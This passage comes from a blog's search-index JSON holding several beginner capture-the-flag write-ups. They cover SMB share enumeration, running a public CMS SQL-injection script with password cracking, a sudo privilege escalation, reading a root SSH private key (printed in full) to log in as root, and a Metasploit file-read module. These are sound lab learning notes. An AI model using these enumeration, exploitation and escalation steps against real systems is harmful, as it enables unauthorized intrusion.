TVRFMElEUTRJRFE0SURFeE5pQXhNak1nTlRZZ05UVWdPVGtnT1RnZ09Ua2dPVGNnTlRRZ05Ea2dOVGNnTlRFZ05UVWdNVEF4SURFd01TQXhNREVnTlRRZ05UQWdORGdnTlRZZ05Ea2dOVEFnTVRBeUlEVTNJREV3TVNBMU5pQXhNREVnTlRNZ09Ua2dOVE1nTlRFZ01UQXdJRFE0SURRNElERXlOUT09 Looking at it closely, I noticed, its the same text, repeated thrice. I therefore did some cleaning by removing the prefix flag3 - then followed to remove two of the repitions and headed back to cyberchef to see if I could decrypt the text and obtain the flag. As shown below, it was encrypted more than once, but once again, I was able to decode it with the help of Cyberchef and got the flag for this challenge: Third flag ~ r00t{87cbca61937eee620812f9e8e5c53d00}\nSheetsNLayers4 # What is flag 4? After solving the last three challenges in this series, I finally got to the last one. I thought to myself, that this is probably going to be as easy as the first three, only to open the sheet and see alot of \u0026ldquo;blood\u0026rdquo; with \u0026ldquo;no comments\u0026rdquo;. Just see for yourself: Anyway I decided to first deal with the \u0026ldquo;blood\u0026rdquo;, I set the whole sheet to white then started looking for more clues. Immediately I saw a cell that stood out and decided to hover my cursor over it and once again, the flag was right there. Use your eyes once again, they say seeing is believing: Let\u0026rsquo;s try and decode it (This time though, CyberChef didnt help so I went back to dcode) The encryption was identified as ROT47 and decoded successfully as shown below: That gave me the last flag for the challenge ~ r00t{87cbca61937eee620812f9e8e5c53d00}\n","date":"24 November 2024","externalUrl":null,"permalink":"/posts/2024-11-24-sheetsnlayers/2024-11-24-sheetsnlayers/","section":"Posts","summary":"\u003cp\u003eThis was a 4-part series of challenges linked to each other. I will explain my approach on solving the challenge below as I captured the first to last flag in that series.\u003c/p\u003e\n\n\u003ch2 class=\"relative group\"\u003eSheetsNLayers1 \n    \u003cdiv id=\"sheetsnlayers1\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline\" href=\"#sheetsnlayers1\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h2\u003e\n\u003cp\u003eWhat is flag 1?\u003c/p\u003e\n\u003cp\u003eWe are given a file to download which happened to be a zip file.\n\n\n\n\n\n\n\n\u003cfigure\u003e\n    \u003cimg class=\"my-0 rounded-md\" loading=\"lazy\" alt=\"TaskFile\" src=\"/images/PerfectRoot/SheetsNLayers/TaskFile.png\"\u003e\n\n  \n\u003c/figure\u003e\n\nI went ahead to unzip the file and found a \u003ccode\u003eSheetsNlayers.vhdx\u003c/code\u003e file, this is a file format used for virtual hard disks. I then mounted the disk on my host machine to explore it further.\n\n\n\n\n\n\n\n\u003cfigure\u003e\n    \u003cimg class=\"my-0 rounded-md\" loading=\"lazy\" alt=\"Flag1 Files\" src=\"/images/PerfectRoot/SheetsNLayers/Flag1\u0026amp;Files.png\"\u003e\n\n  \n\u003c/figure\u003e\n\nI noticed that it contained three more files, one which just happens to be our first flag, so on opening it, this is what I found: \u003ccode\u003e=03YkNTNlNzYjZjYmVGMmFWZ4MTO1QWY0AzM0MmNhdjMzsHdwAjc\u003c/code\u003e. Looks like a Base64 encoded string. I decoded this string from \u003ca\n  href=\"https://www.dcode.fr/base-64-encoding\"\n    target=\"_blank\"\n  \u003edcode\u003c/a\u003e and noticed that it was in reversed form, giving us the flag: \u003ccode\u003er00t{327a6c4304ad5938eaf0efb6cc3e53dc}\u003c/code\u003e This has been illustrated below:\n\n\n\n\n\n\n\n\u003cfigure\u003e\n    \u003cimg class=\"my-0 rounded-md\" loading=\"lazy\" alt=\"Flag1\" src=\"/images/PerfectRoot/SheetsNLayers/Flag1.png\"\u003e\n\n  \n\u003c/figure\u003e\n\u003c/p\u003e","title":"SheetsNLayers","type":"posts"},{"content":"","date":"19 March 2024","externalUrl":null,"permalink":"/categories/networking/","section":"Categories","summary":"","title":"Networking","type":"categories"},{"content":"","date":"19 March 2024","externalUrl":null,"permalink":"/tags/networking/","section":"Tags","summary":"","title":"Networking","type":"tags"},{"content":"","date":"19 March 2024","externalUrl":null,"permalink":"/categories/wifi/","section":"Categories","summary":"","title":"WIFI","type":"categories"},{"content":"","date":"19 March 2024","externalUrl":null,"permalink":"/tags/wifi/","section":"Tags","summary":"","title":"WIFI","type":"tags"},{"content":"","date":"19 March 2024","externalUrl":null,"permalink":"/categories/wpa2/","section":"Categories","summary":"","title":"WPA(2)","type":"categories"},{"content":"","date":"19 March 2024","externalUrl":null,"permalink":"/tags/wpa2/","section":"Tags","summary":"","title":"WPA(2)","type":"tags"},{"content":" Introduction # This challenge is about the basics of SMB and how misconfigurations can lead to compromise of the system SMB is running on. SMB is an acronym for Server Message Block, a protocol used in networks for file sharing that is implemented on Microsoft Windows operating systems. A quick Google search can reveal the same: Disclaimer: The content presented in this article is for educational purposes only and does not endorse or encourage any form of unauthorized access or malicious activity.\nNote If you\u0026rsquo;re following through practically, make sure you use the target\u0026rsquo;s machine\u0026rsquo;s IP provided once you click the start machine icon on the challenge webpage.\nEnumeration. # Once you spawn the target, you are given a vulnerable target\u0026rsquo;s IP (in my case: 10.129.84.148 ) which we will enumerate by use of NMAP by running the command:\nnmap 10.129.84.148 which should scan and give us a report on open ports running on the target as shown below: We see that the target has three open ports and one specifically running Microsoft-ds on port 445.\nObservations \u0026amp; Findings # Now that we know the service running on this port, we can try and list the shares available on the target by running the command:\nsmbclient -N -L \\\\\\\\10.129.84.148 The -N option suppresses the password prompt that is needed to connect to this service, -L on the other hand lists the shares available on the target. Here are the results from our target.\nWe already know the shares available on the target, so I can now try to connect to each of the available shares, but I don\u0026rsquo;t have a password, so I am going to try to log in to each of them without giving a password.\nFoothold # Things don\u0026rsquo;t seem to go as planned, except for just one share that lets me in without a password, the WorkShares share. Here is the command I ran to be able to connect to it:\nsmbclient \\\\\\\\10.129.84.148\\\\WorkShares When prompted for a password, press enter.\nNow we list the directories available using ls and see a couple of interesting stuff here, in essence, there are two users listed:\nAmy.J James.P I check the first user\u0026rsquo;s folder, but there is no sign of the flag. Next, I try to navigate to the second user\u0026rsquo;s folder.\nSolution/Flag # I do this by running the following command:\ncd James.P Then I list the contents of his directory where we see a file called flag.txt which we then download to our attack machine using:\nget flag.txt Then leave this service by running the exit command. Now since we are back on our attack machine we can navigate to the directory where the flag file is saved and view its contents.\nWe have our flag for this challenge. That also leaves us with all the answers to the questions that came with this challenge.\nConclusion # In summary, the SMB protocol is very useful in sharing resources between hosts. However, a big security risk is onboarded if this protocol is misconfigured. This room has shown me how easy it can be to gain access to shares within an SMB if there are few to no strict security measures associated with it.\nhushkat signing off.\n","date":"25 February 2024","externalUrl":null,"permalink":"/posts/2024-02-25-dancing.md/2024-02-25-dancing/","section":"Posts","summary":"\u003ch3 class=\"relative group\"\u003eIntroduction \n    \u003cdiv id=\"introduction\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline\" href=\"#introduction\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h3\u003e\n\u003cp\u003eThis challenge is about the basics of SMB and how misconfigurations can lead to compromise of the system SMB is running on. SMB is an acronym for Server Message Block, a protocol used in networks for file sharing that is implemented on Microsoft Windows operating systems. A quick Google search can reveal the same:\n\n\n\n\n\n\n\n\u003cfigure\u003e\n    \u003cimg class=\"my-0 rounded-md\" loading=\"lazy\" alt=\"google_search\" src=\"/images/HTB/Q1.png\"\u003e\n\n  \n\u003c/figure\u003e\n\u003c/p\u003e\n\u003cp\u003e\u003cem\u003eDisclaimer: The content presented in this article is for educational purposes only and does not endorse or encourage any form of unauthorized access or malicious activity.\u003c/em\u003e\u003c/p\u003e","title":"DANCING","type":"posts"},{"content":"","date":"25 February 2024","externalUrl":null,"permalink":"/categories/hackthebox/","section":"Categories","summary":"","title":"HackTheBox","type":"categories"},{"content":"","date":"25 February 2024","externalUrl":null,"permalink":"/tags/hackthebox/","section":"Tags","summary":"","title":"HackTheBox","type":"tags"},{"content":"","date":"25 February 2024","externalUrl":null,"permalink":"/tags/smbclient/","section":"Tags","summary":"","title":"Smbclient","type":"tags"},{"content":"","date":"25 February 2024","externalUrl":null,"permalink":"/categories/starting-point/","section":"Categories","summary":"","title":"Starting-Point","type":"categories"},{"content":"","date":"25 February 2024","externalUrl":null,"permalink":"/tags/starting-point/","section":"Tags","summary":"","title":"Starting-Point","type":"tags"},{"content":"","date":"31 December 2023","externalUrl":null,"permalink":"/categories/gobuster/","section":"Categories","summary":"","title":"Gobuster","type":"categories"},{"content":"","date":"31 December 2023","externalUrl":null,"permalink":"/tags/gobuster/","section":"Tags","summary":"","title":"Gobuster","type":"tags"},{"content":" Introduction # Hello guys, it has been quite some time since I made a CTF writeup and I figured it\u0026rsquo;s time to share some of my notes with you. Like many of you, I am a beginner and I am still learning and exploring stuff in cyber security. Just recently I got interviewed by CyberShujaa as I had applied to be a scholar in their program for the Security Analyst path. I am happy to say that I have been shortlisted for the program. As part of the admission process, I was required to try out this beginner-level CTF challenge and I thought it wise to take some notes while solving it. You can find the challenge here.\nDisclaimer: The content presented in this article is for educational purposes only and does not endorse or encourage any form of unauthorized access or malicious activity.\nSimpleCTF Challenge. # After clicking the start machine icon on the challenge webpage, you are presented with an IP of the vulnerable target, the first thing I normally do is to ping the target just to see if it is alive. Since we have replies from the target we will now proceed to the next step of exploration.\nObservations \u0026amp; Findings # We begin by scanning the target using the tool Nmap to find open ports running on it and also identify the services running on those ports. to do that, we use the command:\nnmap -sV 10.10.64.42 Note If you\u0026rsquo;re following through the tutorial, make sure you use the target\u0026rsquo;s machine\u0026rsquo;s IP provided once you click the start machine icon on the challenge webpage. Here are the results from our scan.\nNotice that we have three open ports.\nPort 22 running ftp Port 80 running HTTP Port 2222 running SSH Now we try accessing the webpage running on port 80 by pasting the IP and port number (80) for the service on the browser and we are welcomed with this page: There is not much going on here so I decided to brute force the target\u0026rsquo;s website to see if I can find other web pages that might be helpful in this quest. For this, I use Gobuster using this command:\ngobuster dir -u http://10.10.64.42:80 -w /usr/share/wordlists/directory-list-2.3-small.txt Here are the results from the brute force attack: We discover a directory /simple that we now visit on the browser and find this: When we scroll down to the footer of the webpage, we find something interesting: What comes to sight is the version number of the tool that was used to build this website. So I run a quick Google search about its vulnerabilities and possible exploits. It is discovered that CMS Made simple version 2.2.10 and below are vulnerable to SQL Injection. I found a good Python script that can be used to exploit this vulnerability here.\nI download the script and try to run it to see its usage: .\nAfter seeing its usage, we can now decide the syntax to use for the exploit to work on the target depending on our needs. so we use the command:\npython3 cmsexploit.py -u http://10.10.64.42:80 --crack -w /usr/share/wordlists/rockyou.txt After running for a while we get the following output as shown below, and it contains:\nThe salt for the password some identified user The user\u0026rsquo;s username Their email address Hashed password The cracked password Now that we have some credentials let\u0026rsquo;s try them out on another service that we found running on the target SSH. The command for logging in on ssh using the username and password that we found is:\nssh mitch@10.10.64.42 -p2222 Then type yes and accept to proceed and provide the acquired password. A successful login should land you at a terminal like this:\nSolution/Flag # Now that we are logged in as Mitch I try to list the contents of his home directory and voila, we capture our first flag which is in the user.txt file.\nI then try to go back to see if there is any other user on this machine and if I have access to their directory. I found another user sunbath but have no access to his directory. I moved back to another directory and tried to gain access to the root\u0026rsquo;s directory but again, I hit a wall. I run the command:\nsudo -l to see what permissions Mitch has or what he can run as root without having to provide a password. The results: We gain access to the root shell after finding out that he can access vim as root. To find the custom command to cater to your needs use this website. Now that we\u0026rsquo;re root, let\u0026rsquo;s confirm that and see if we have access to the root\u0026rsquo;s directory.\nConclusion # In summary, this challenge underscores the significance of privilege escalation techniques for unearthing concealed data and vulnerabilities. By leveraging the use of tools and exploits, directory permissions, and sudo privileges, we elevate our access and seize the flags.\nRemember, relentless learning and exploration are paramount to mastering hacking skills. Embrace the journey, and let the quest for knowledge fuel your hacking endeavors.\ndr0idbot signing off.\n","date":"31 December 2023","externalUrl":null,"permalink":"/posts/2023-12-31-simplectf/2023-12-31-simplectf/","section":"Posts","summary":"\u003ch3 class=\"relative group\"\u003eIntroduction \n    \u003cdiv id=\"introduction\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline\" href=\"#introduction\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h3\u003e\n\u003cp\u003eHello guys, it has been quite some time since I made a CTF writeup and I figured it\u0026rsquo;s time to share some of my notes with you. Like many of you, I am a beginner and I am still learning and exploring stuff in cyber security. Just recently I got interviewed by \u003ca\n  href=\"https://cybershujaa.co.ke/\"\n    target=\"_blank\"\n  \u003eCyberShujaa\u003c/a\u003e as I had applied to be a scholar in their program for the Security Analyst path. I am happy to say that I have been shortlisted for the program. As part of the admission process, I was required to try out this beginner-level CTF challenge and I thought it wise to take some notes while solving it. You can find the challenge \u003ca\n  href=\"https://tryhackme.com/room/easyctf#\"\n    target=\"_blank\"\n  \u003ehere\u003c/a\u003e.\u003c/p\u003e","title":"SimpleCTF","type":"posts"},{"content":"","date":"11 August 2023","externalUrl":null,"permalink":"/categories/htbssh_keys/","section":"Categories","summary":"","title":"HTB,SSH_Keys","type":"categories"},{"content":" Introduction # After breaching a target\u0026rsquo;s defenses and exploiting system vulnerabilities, hackers often find themselves with limited privileges. To overcome this, privilege escalation becomes essential to navigate through defenses and gain the muscle needed to carry out a successful attack.\nDisclaimer: The content presented in this article is for educational purposes only and does not endorse or encourage any form of unauthorized access or malicious activity.\nPrivilege Escalation Challenge. # Welcome back to another HackTheBox challenge, an easy Capture The Flag (CTF) exercise. The past few blogs have been covering the module Getting Started. The instructions provided are as follows: SSH (Secure Shell) is a secure network communication protocol allowing encrypted connections between computers, making it suitable for use on insecure networks.\nObservations \u0026amp; Findings # We begin by using the provided credentials to establish an SSH connection to the target machine: If you\u0026rsquo;re following through Note that the machine IP and port number might be different in your case, make sure you replace that with what you have been given.\nOur first command:\n┌──(papab3ar㉿kali)-[~] └─$ ssh user1@94.237.49.11 -p 31973 Upon connection, a message about host authenticity appears. Confirm by typing \u0026ldquo;yes\u0026rdquo; and entering the provided password. A successful login grants terminal access:\nWelcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.10.0-18-amd64 x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage This system has been minimized by removing packages and content that are not required on a system that users do not log into. To restore this content, you can run the \u0026#39;unminimize\u0026#39; command. The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. user1@ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827:~$ Attempting to list directories reveals limited information. Exploring further, we discover another user, user2:\nuser1@ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827:~$ cd ../ user1@ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827:/home$ ls user1 user2 Navigation to user2\u0026rsquo;s directory uncovers the flag.txt file, but access is denied:\ncat: flag.txt: Permission denied What a bummer! our current user has no permission to read user2 files or documents. So now I want to see the list of permissions the users on this machine have so I use:\nsudo -l The output:\nMatching Defaults entries for user1 on ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User user1 may run the following commands on ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827: (user2 : user2) NOPASSWD: /bin/bash Something interesting shows up here about our users. First, we see the text NOPASSWD: Indicating that our current user (user1) is allowed to run the specified commands without being prompted for a password. This can be a security feature to streamline certain processes, but it also carries some security risks.\nThen we note the /bin/bash: This is the path to the \u0026ldquo;bash\u0026rdquo; shell executable. Allowing user1 to run \u0026ldquo;/bin/bash\u0026rdquo; means they have the ability to start an interactive shell session. This could potentially grant them significant control over the system.\nWith this in mind, I now want to see if it will work. So I run the following command for user2 as user1:\nsudo -u user2 /bin/bash From the terminal, this seems to have worked since the CLI switched from:\nuser1@ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827: to this:\nuser2@ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827:~$ Notice that we now have user2 access. So, once again, we try to read the flag.txt file and manage to get the flag.\nuser2@ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827:~$ ls flag.txt user2@ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827:~$ cat flag.txt HTB{l473r4l_********_**_*******_u53r} Ah great, so what, are we done? Or is there more we could do here? We have further instructions: Now we try to see if we can be the root user for this machine, escalating our privileges even further. First I navigate to the root user folder using the following commands:\ncd ../../ ls cd root Then I list all directories and this is the output I get:\nuser2@ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827:/root$ ls -a . .. .bash_history .bashrc .profile .ssh .viminfo flag.txt As you can see here, we have our flag.txt file. I\u0026rsquo;m tempted to open it, and I do, but again, I get denied permission to do so. I then notice another interesting directory,.ssh. So I navigate to it and list its contents.\nThe .ssh folder in a user\u0026rsquo;s home directory on a Unix-like operating system that contains important files and directories related to SSH (Secure Shell) authentication and communication.\nauthorized_keys: Contains a list of public keys authorized to access the user account using SSH key-based authentication. Each line in this file represents a separate public key. When a client (remote computer) attempts to connect to the user account, the server checks if the client\u0026rsquo;s public key matches any of the keys listed in this file. If there\u0026rsquo;s a match, the client is granted access without needing to enter a password.\nid_rsa: A private key file for the user\u0026rsquo;s SSH key pair. The private key is kept secret and should never be shared or exposed. It is used for authentication when the user tries to log in to remote servers. When the user initiates an SSH connection, their local computer uses the private key to sign a challenge from the server, proving their identity without transmitting the actual private key. Only the corresponding public key is shared with remote servers.\nid_rsa.pub: Contains the public key that corresponds to the private key (id_rsa). The public key can be freely shared and is typically copied to remote servers to set up key-based authentication. Remote servers use the public key to verify the user\u0026rsquo;s identity during the SSH authentication process.\nNow it is time to see if we have access to the id_rsa file. If we do, we can use the root user\u0026rsquo;s private key to gain root access to this machine hence further elevating our privileges from user2. I open this file using the cat command and sure enough, I get access to the private key.\ncat id_rsa -----BEGIN OPENSSH PRIVATE KEY----- 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 -----END OPENSSH PRIVATE KEY----- Solution/Flag # I copy the key to my local machine in a file named id_rsa and save it, then try to use it to log in as the root user using the commands:\n──(papab3ar㉿kali)-[~] └─$ ssh root@94.237.49.11 -p 31973 -i id_rsa Let me break this command down in bits: ssh: This is the command used to start an SSH connection.\nroot@94.237.49.11: This specifies the username and IP address of the remote server. In this case, the username is \u0026ldquo;root,\u0026rdquo; and the IP address is \u0026ldquo;94.237.49.11.\u0026rdquo;\n-p 31973: This option specifies the port number to use for the SSH connection. The port number is set to \u0026ldquo;31973.\u0026rdquo;\n-i id_rsa: This option specifies the identity (private key) file to use for authentication. In this case, the private key file named \u0026ldquo;id_rsa\u0026rdquo; is being used for authentication. of-course we gain access to the machine as the root user as we get the welcome banner like we got during our initial access with the root user\u0026rsquo;s shell:\nroot@ng-894740-gettingstartedprivesc-jb8qw-c7f9799cb-bd827:~# So now we just list directories and read the contents of the flag.txt file.\nls cat flag.txt HTB{pr1v1l363_**********_2_r007} Conclusion # In summary, this challenge underscores the significance of privilege escalation techniques for unearthing concealed data and vulnerabilities. By leveraging SSH keys, directory permissions, and sudo privileges, we elevate our access and seize the flag.\nRemember, relentless learning and exploration are paramount to mastering hacking skills. Embrace the journey, and let the quest for knowledge fuel your hacking endeavors.\n","date":"11 August 2023","externalUrl":null,"permalink":"/posts/2023-08-11-privilege-escalation/2023-08-11-privilege-escalation/","section":"Posts","summary":"\u003ch3 class=\"relative group\"\u003eIntroduction \n    \u003cdiv id=\"introduction\" class=\"anchor\"\u003e\u003c/div\u003e\n    \n    \u003cspan\n        class=\"absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100 select-none\"\u003e\n        \u003ca class=\"group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline\" href=\"#introduction\" aria-label=\"Anchor\"\u003e#\u003c/a\u003e\n    \u003c/span\u003e        \n    \n\u003c/h3\u003e\n\u003cp\u003eAfter breaching a target\u0026rsquo;s defenses and exploiting system vulnerabilities, hackers often find themselves with limited privileges. To overcome this, privilege escalation becomes essential to navigate through defenses and gain the muscle needed to carry out a successful attack.\u003c/p\u003e\n\u003cp\u003e\u003cem\u003eDisclaimer: The content presented in this article is for educational purposes only and does not endorse or encourage any form of unauthorized access or malicious activity.\u003c/em\u003e\u003c/p\u003e","title":"Privilege Escalation","type":"posts"},{"content":"","date":"11 August 2023","externalUrl":null,"permalink":"/categories/privilegeescalation/","section":"Categories","summary":"","title":"PrivilegeEscalation","type":"categories"},{"content":"","date":"11 August 2023","externalUrl":null,"permalink":"/tags/privilegeescalation/","section":"Tags","summary":"","title":"PrivilegeEscalation","type":"tags"},{"content":"","date":"11 August 2023","externalUrl":null,"permalink":"/tags/ssh_keys/","section":"Tags","summary":"","title":"SSH_Keys","type":"tags"},{"content":"","date":"2 August 2023","externalUrl":null,"permalink":"/categories/metasploit/","section":"Categories","summary":"","title":"Metasploit","type":"categories"},{"content":"","date":"2 August 2023","externalUrl":null,"permalink":"/tags/metasploit/","section":"Tags","summary":"","title":"Metasploit","type":"tags"},{"content":"","date":"2 August 2023","externalUrl":null,"permalink":"/tags/plugins/","section":"Tags","summary":"","title":"Plugins","type":"tags"},{"content":" Introduction # Welcome to yet another writeup where I cover an important tool used by hackers to exploit vulnerabilities on different systems: Metasploit In this challenge, part of the \u0026ldquo;Getting started\u0026rdquo; series on HackTheBox Academy, we will be delving into the realm of public exploits and uncovering the power of Metasploit.\nDisclaimer: The content presented in this article is for educational purposes only and does not endorse or encourage any form of unauthorized access or malicious activity.\nPublic exploits Challenge. # The challenge instructions were simple: \u0026ldquo;Try to identify the services running on the server above, and then try to search to find public exploits to exploit them. Once you do, try to get the content of the \u0026lsquo;/flag.txt\u0026rsquo; file.\u0026rdquo; The main focus of this challenge is to demonstrate the ability to identify vulnerabilities and effectively exploit them. Let\u0026rsquo;s begin our journey by examining the target IP address and visiting the associated webpage. Observations \u0026amp; Findings # Upon accessing the webpage, the very first thing that caught our attention was a version number and a brief description of a WordPress service. Drawing from our knowledge of how to find and exploit publicly available vulnerabilities, we swiftly launched the Metasploit console to search for an exploit relevant to this specific version. ──(dr0idbot㉿kali)-[~] └─$msfconsole - - - - - SNIP - - - - - msf6 \u0026gt; search exploit wordpress 2.7.10 Matching Modules ================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/scanner/http/wp_simple_backup_file_read normal No WordPress Simple Backup File Read Vulnerability Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/http/wp_simple_backup_file_read msf6 \u0026gt; Metasploit came back with results, indicating that there is a publicly available exploit matching the version we found on the website.\nNotice the command used to spin up metasploit msfconsole after its up and running, we run the command search exploit wordpress 2.7.10 to see if there are any publicly available exploits for this plugin version. Sure enough, metasploit brings back results and slight description of what we are looking for matching the info on the website we had visited earlier on.\nWe have an option to see information about that exploit before using it, to see what they payload does. For that we use the command info plus the index of the exploit itself.\nmsf6 \u0026gt; info 0 Basic options: Name Current Setting Required Description ---- --------------- -------- ----------- DEPTH 6 yes Traversal Depth (to reach the root fold er) FILEPATH /etc/passwd yes The path to the file to read Proxies no A proxy chain of format type:host:port[ ,type:host:port][...] RHOSTS yes The target host(s), see https://docs.me tasploit.com/docs/using-metasploit/basi cs/using-metasploit.html RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connecti ons TARGETURI / yes The base path to the wordpress applicat ion THREADS 1 yes The number of concurrent threads (max o ne per host) VHOST no HTTP server virtual host Description: This module exploits a directory traversal vulnerability in WordPress Plugin \u0026#34;Simple Backup\u0026#34; version 2.7.10, allowing to read arbitrary files with the web server privileges. - - - - - SNIP - - - - - As you can see, a bunch of information is given about this particular exploit with a number options that we need to set in order for the payload to work on our target. Next we use the command use plus the index of the exploit we have picked for the exploitation. After selection we set the options that are required by metasploit before executing the payload.\nmsf6 \u0026gt; use 0 msf6 auxiliary(scanner/http/wp_simple_backup_file_read) \u0026gt; set FILEPATH /flag.txt msf6 auxiliary(scanner/http/wp_simple_backup_file_read) \u0026gt; set RHOSTS 94.237.49.11 msf6 auxiliary(scanner/http/wp_simple_backup_file_read) \u0026gt; set RPORT 41884 After obtaining information about the exploit, including the required options, we set the necessary values to ensure the payload 